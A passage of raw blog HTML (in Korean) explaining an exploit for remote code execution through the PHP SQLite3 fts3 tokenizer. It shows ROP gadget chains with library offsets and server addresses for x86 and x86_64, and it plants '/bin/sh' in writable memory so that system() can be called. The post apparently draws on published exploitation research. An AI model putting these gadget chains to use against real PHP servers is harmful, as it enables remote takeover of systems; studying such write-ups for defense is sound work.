style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY01WQaU/CQBCGl0PkqCBqactRoeVubRHlKAQolpZYqIox4v//I6/ZMYT4YbKZ2Z1nnln2NHLRMyeoqn00dBuS0kbi4gZZQaaapLQQS1yjUKyhdm9AlJtg8QLuShrUuglR0imPJ4sUbBMcqJjJyQijI9yXCJeZEqRyG7u3HzjzgBr01iPC/RGD4RKMCTDtGfztAdZgDsauzkDXi8hKyFewWIWYznyksxJKchOe/46xsyFDbr8Nv2APF2AsB8Ny4G8/0e4+/wd6wQfK1S4BX/ffWLo7pNIilEqHjMdTj4Bq44HsOYgb9owJVus9Ov0RWCx/BmpNm9blEN7E4X9/qKCuWbT66XEydUt3fAA/efA6z0/AXze9iQhuLwfFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png\"\n        srcset=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/e9ff0/13.png 180w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/f21e7/13.png 360w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png 720w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/7de01/13.png 794w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"rop-기법을-활용하여-rce-취약점-수행\" style=\"position:relative;\"><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\" aria-label=\"rop 기법을 활용하여 rce 취약점 수행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP 기법을 활용하여 RCE 취약점 수행</h3>\n<ul>\n<li>앞서 취약점 활용하여 원하는 가젯들을 체인할 수 있는 벡터를 마련하였습니다.</li>\n<li>중요한 사실은 RCE를 발생하기 위해서 “/bin/sh” 명령을 내리기 위해 문자열이 있는 메모리 공간이 있어야 합니다.</li>\n<li>읽기/쓰기 가 가능한 메모리 영역으로 문자열을 쓰기 위해 하드 코딩으로 문자열을 4바이트씩 끊어 가면서 메모리 상에 쓰고 마지막에 널 바이트를 추가합니다.</li>\n<li>시스템 라이브러리 함수를 호출할 때 해당 문자열의 포인터 주소를 불러와서 호출을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">## command move step <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>~<span class=\"token number\">5</span> repeat<span class=\"token punctuation\">)</span>\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;command<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>                 --------> CMD\npop edx ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305e09</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82e09</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9ce09</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3+<span class=\"token punctuation\">(</span><span class=\"token number\">0x8eaa0</span><span class=\"token number\">-0x18</span><span class=\"token punctuation\">)</span>                         -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8a88</span>, <span class=\"token number\">0xea8a8c</span>, <span class=\"token number\">0xea8a90</span>, <span class=\"token number\">0xea8a94</span>, <span class=\"token number\">0xea8a98</span>,<span class=\"token number\">0xea8a9c</span>, <span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\nmov [edx<span class=\"token number\">+0x18</span>], eax ; ret   --------> libc-2_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x004e3642</span><span class=\"token punctuation\">)</span>     -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2a642</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0d642</span><span class=\"token punctuation\">)</span>\n\n## <span class=\"token keyword\">call</span> system\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>     -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;lib_system                 --------> libc<span class=\"token number\">-2</span><span class=\"token number\">+0x3af60</span>                                       -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1df60</span><span class=\"token punctuation\">)</span>\npop esi ; ret               --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb71a8902</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3<span class=\"token number\">+0x8eaa0</span>                                   -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\npush esi ; <span class=\"token keyword\">call</span> eax;        --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb7371b07</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>해당 가젯들은 노출된 메모리 주소에서 offset 계산을 통해 가젯을 선정한 후 쓰기 가 가능한 공간으로 <code class=\"language-text\">libcsqlite3</code> .bss 섹션을 활용합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQY01WQSU/CYBRFP8HZhUOiCwIqKlBKoS0dgTKUwVKQAgJGMSb+/z9xTL+di7N4ycu5N1c43pCK6qCbXbzWGL89ofBQkyxWewajBZnDa1TNJ1ntMaweB9kr2kHEevPDfVHj+PSWcJwwne0QptWjWnPRzQDLDSUNM+CpZBDFG7r9GdmjGxTVJZ7vaBiBDHD9MfPkk8KjxsnZHeEoIYq3iKbdl8+p0HZDSV3v8Fw2Wa6/GQwXCHFBperIRqlQiHP8zivbj19y+Soic8kkeudt+YWwveE/oeUM0JtdcnmF4osup1DkJAGliiXbp3cqLis2daODqnnU6i3JH5h2f2FmvciIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png\"\n        srcset=\"/static/0c5aaf84765af8a9c30679d4c05294dd/e9ff0/14.png 180w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/f21e7/14.png 360w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png 720w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/715a3/14.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">edx</code> 레지스터에 대입된 <code class=\"language-text\">sqlite3SavedPrng</code> 주소 +0x18 번지로 역참조된 값에 하드 코딩된 값을 집어넣었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQozzVRa3OaUBC9aZq2aSoBY2ulxGiiCEbEIKCCNqLGV0TGaGKtfXzo9P//hNPZdfqBWe7uztnzELV6B+3gAfZdD64foelH0A0Xnz6X8CVfRUl3ULyxcVO+gyRf4vQsi+tSA7rR5NlV0cKr1wqOjmWuouH0EPamKFcctMMx/PYQQXeCiumhVg8wX7xgOt8gTr4jX7SQkjWMp2vEyY5799ECxydpBmNA89ZH0+szCwKvN0I47j1004VR9TGZbTAYJVxVzcSbdx8Z5GHyxH1SJUQK4kg6ANbsAN2vM6bvtYZw3D6zpD5Jc7w+ouESy9Uelh3yYbKFVDzGW56plybkdJ5lC2IXjZaoVD10wjF/QW8KrzXAuZKHEO/R6oywfv6N1eYXtrs/3M/mdH6v1j+x2//lfWZK8uiKQYDdCQNSSLSgXFyxFGKcrPZ4jL9xVS4KyGkGe7hY7pA8/WC7GPDWOqRMKRJbGtAR+pdkjZfoPVu8cBjzeMvysrkyh0XeknTLDiCEdAiFQMlD1x+gcF2HqhlQMgWcpVRO8IOkIp0pMGOqJ28zHA4x/d+jXfLwH6xn97mP1bOQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"asd.png\"\n        title=\"asd.png\"\n        src=\"/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png\"\n        srcset=\"/static/004ea3989fb2f251c19019243f3e9b52/e9ff0/asd.png 180w,\n/static/004ea3989fb2f251c19019243f3e9b52/f21e7/asd.png 360w,\n/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png 720w,\n/static/004ea3989fb2f251c19019243f3e9b52/5a6dd/asd.png 802w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeElEQVQoz42SWXOCQBCEUWO8oiIKiOKNFx4cCqKo8Uoqlcr//zudmjHxQS2Th66dpXa/7ZlGqDVGMMcBxtYKU2cNvW5CklvIZDVo1T6iTwVWJCZe6kcSnpMyJtYKc38Pb3GArHYwsUOIUh1tw2aQEMlfoH+BhXiiBH95wmb3idf9Fyr6kB0X5Tb6Q49dJlIyBCF7gT2CMpAu2u4WUztEodiE0XMZPLXXCFZvMHoOkmkVsbj0H4dF2O4GXnDklpWyAW9x5EeC8B3h5gOWuwHNOpVRb4DXe57hfHHAYnmC6+1QrvR4djRLPzjBD45wZlv0TQ90lloXIrmzorezFZrtKcxJwA5yoo5MtoJ0VkP6ReNgSkqHXZMKxcbPtzbXybRy65DaJXczb4eB6UHTBxeXBKEHcmINUqnFQeULZyDVqUz5FjiaLHnwlrPGwPTZqap1WRV9wP8jBcIt/rZLK+ley5QoQQlAjmilg3SB6mptCKXc5YTvpXrt8Butyv1aAcVepwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png\"\n        srcset=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/e9ff0/15.png 180w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/f21e7/15.png 360w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png 639w\"\n        sizes=\"(max-width: 639px) 100vw, 639px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>가젯 들이 동작을 하면서 마지막으로 시스템 라이브러를 호출하여 Code Execution을 수행합니다.</li>\n</ul>\n<h1 id=\"x86_64bit-환경-php-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86_64bit-%ED%99%98%EA%B2%BD-php-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86_64bit 환경 php sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86_64bit 환경 PHP SQLite3 fts3 tokenizer RCE 취약점</h1>\n<ul>\n<li>앞서 x86 환경에서의 공통된 취약점을 이용하며 새로운 가젯을 사용해 xCreate의 콜백 함수를 조절해서 원하는 페이로드를 실행하여 RCE를 수행해봅시다.</li>\n</ul>\n<h3 id=\"rop를-활용해서-시스템-라이브러리-함수-호출-진행\" style=\"position:relative;\"><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\" aria-label=\"rop를 활용해서 시스템 라이브러리 함수 호출 진행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP를 활용해서 시스템 라이브러리 함수 호출 진행</h3>\n<ul>\n<li>64bit 환경은 32bit 환경과 다르게 레지스터를 활용해서 인자를 주고 받기 때문에 ROP 구조를 새로 구성합니다.</li>\n<li><code class=\"language-text\">[libphp5.so](http://libphp5.so)</code> 공유 라이브러리 안에 실행 권한이 있는 부분의 가젯들을 이용해서 ROP Chain을 설계 해봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">leave<span class=\"token punctuation\">;</span>                     <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">stack</span> pivot\nret<span class=\"token punctuation\">;</span>                       <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">payload</span><span class=\"token operator\">-></span><span class=\"token property\">esp</span>\n\npop rax<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rax</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> system_lib\npop rbx<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rbx</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> wirtable <span class=\"token function\">memory</span><span class=\"token punctuation\">(</span>Cookie_path<span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">;</span>\n\nmov rdi<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>            <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rdi</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span> <span class=\"token function\">address</span><span class=\"token punctuation\">(</span>writalbe memory<span class=\"token punctuation\">)</span>\ncall rax<span class=\"token punctuation\">;</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY022QaQuCQBCGzSxLzQPL1qwktYMOy+iQLiio//+P3pipKMgPLzuzMM8+s1KrHWO1vmCzu6IXzlDT2gijFJrhc+q6QEVtQqm6nE8tKw5KZZvP30gESLMT8sMd8TCD3uggGa25jpIVwsECpt2FJFswzACOG4Ik1LoHSS4AksUyOyM/PhhEvScSTOc5h2oaJht6XG/4DFZUt9hQM8QL+DakFQkyme6w2d8wiJdsSMOW00dLJBDBmOFk/QckwDw9YLu/8XrUE8QPxrxa04v47mvYgWn3+C+LDJ+LM32NwjeMOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png\"\n        srcset=\"/static/a71eafd63c47699567611c2dc9fba1ec/e9ff0/16.png 180w,\n/static/a71eafd63c47699567611c2dc9fba1ec/f21e7/16.png 360w,\n/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png 720w,\n/static/a71eafd63c47699567611c2dc9fba1ec/024d6/16.png 961w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Stack Pivot 가젯을 이용해서 <code class=\"language-text\">ps_globals</code> 구조체의 주소 값을 스택 메모리 상으로 변경하여 ps_globals에 저장되어 있는 필드들을 확인할 수 가 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQoz3WRa0sCURCGj1oRkZmmqOtdS1td9+Kqu7quq+s188aKJSEI/f//8MYZ8INFHw4Mh+GZZ95hYq0NSe5C0XoQawYkuYOEUIGQfkW+KKMsNpFMVRAMpRCLlxCJFhB+yiNwHYEv8Aj/VfjiMbVho22Ooel96K0BmoaLXFFGtzeDZc/huEsCCRkRk5kH21nAtKa4uY39A9T7aJsjKA0bstojaFUy4AyXGE23mMw9xJNlJIQyVpsvuOMNOtaUYMwXIgivz3AmqxYaTQd1xaK1taaDithCLP4MRbOxXB9gdifgfZlcDb3+Gw3iwyPRPJg/dGnIYS3DJUO+Nq95pozdIZ2tYusdsdufaF1uwc033hEfh2+8VHQwdn8JrKsW1EYfVckkC56pKBk0OZuXCMQhXXtGufH8pvMd5os9HY2x4G/DAWV4PgqvOZT5HlAoKWTzvvrEcLwm4MBd0Z+3P6FU1v4Y/gAHWs8nUgHCoAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png\"\n        srcset=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/e9ff0/17.png 180w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/f21e7/17.png 360w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png 720w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/a0b80/17.png 955w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시스템 라이브러리 함수를 호출하기 위해서 스택상에 있는 시스템 라이브러리를 rax 레지스터가 가리키는 형태로 진행 하였습니다.</li>\n<li>후, rbx 레지스터를 이용해서 Cookie_path 필드에 삽입한 문자열을 가리키는 주소를 대입합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY04WRa1OCQBSGV+1muFwsaAMk0kpBQsQNJJTsMtX//0Nvs2caPjn64Z2deefMs8/ZZbncIc02kMU7kvQVjHFww4Nu+tC4C43fUtfpmZTuidWe+8Kesxpl9YWq/ka1+aFh4T5hFhewrkIEYYK+JtA7HR6FETBOSqxedsjlG5K0otK+mcAPYozu5qibX2T5luwHugvWNY4B1wRTWSy3ZOCIB9xPFvBGEYr1J9SMMj27sME6emu6z5ZF/4Yqy1XTAsNxCuFNIcsPehJ1oTI/79uHDaeRxGxeIMsbWkuV186YDB3xSGBzGIAbPgwrwOVAHPyUPw09mgtiwo4CAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png\"\n        srcset=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/e9ff0/18.png 180w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/f21e7/18.png 360w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png 720w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/62de4/18.png 746w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">ps_globals</code> cookie_path 필드는 삽입한 페이로드를 가리키는 포인터이기 때문에 rbx 레지스터에 대입을 한 후 참조하는 과정이 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token number\">0x7ff9d4cefbc0</span> <span class=\"token operator\">&lt;</span>ps_globals<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>  <span class=\"token operator\">=></span> <span class=\"token number\">0x00007ff9d8b15908</span>\n\n<span class=\"token number\">0x00007ff9d8b15908</span> <span class=\"token operator\">=></span>  <span class=\"token string double-quoted-string\">\"/bin/sh\"</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI112ObwuCMBjEV5qE2dga/RuFWdKb0E2tIFhR3/9DXTyDifjixz3cwx3HbtULdeNQW4c02yOZr8HFERnX2OxKSHXy3iQSmMYS0WzlNdxE+BHMNA735w+mffvwYqlxLi2Ki4FtP9jqK+JE9SHSMUOf0bLu8e0LaWVeVODiAKlyXxYCYcWY4cI/TMBJZVzFvA4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png\"\n        srcset=\"/static/72796d74fdfa4002b09dd9c30cdc6621/e9ff0/19.png 180w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/f21e7/19.png 360w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png 720w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/ddc81/19.png 837w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>rbx 레지스터를 참조한 값을 호출 규약에 맞게 rdi 레지스터에 mov 명령을 통해 대입한 후 code execution을 실행합니다.</li>\n</ul>\n<h1 id=\"참조\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EC%A1%B0\" aria-label=\"참조 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참조</h1>\n<hr>\n<p><a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-Remote-Exploitation-Of-SQLite-And-Curl-wp.pdf\">us 19 Qian Exploring The New World Remote Exploitation Of SQLite And Curl wp</a></p>\n<p><a 